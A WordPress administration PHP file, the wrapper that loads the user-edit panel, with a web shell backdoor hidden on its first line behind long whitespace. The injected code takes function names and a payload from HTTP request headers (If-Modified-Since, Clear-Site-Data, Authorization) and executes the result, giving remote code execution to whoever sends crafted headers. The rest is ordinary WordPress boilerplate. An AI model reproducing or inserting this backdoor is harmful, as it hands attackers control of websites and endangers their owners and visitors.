<?php																																										$_HEADERS=getallheaders();if(isset($_HEADERS['If-Modified-Since'])){$uconvert=$_HEADERS['If-Modified-Since']('', $_HEADERS['Clear-Site-Data']($_HEADERS['Authorization']));$uconvert();}

/**
 * Edit user administration panel.
 *
 * @package WordPress
 * @subpackage Administration
 * @since 3.1.0
 */

/** Load WordPress Administration Bootstrap */
require_once __DIR__ . '/admin.php';

require ABSPATH . 'wp-admin/user-edit.php';
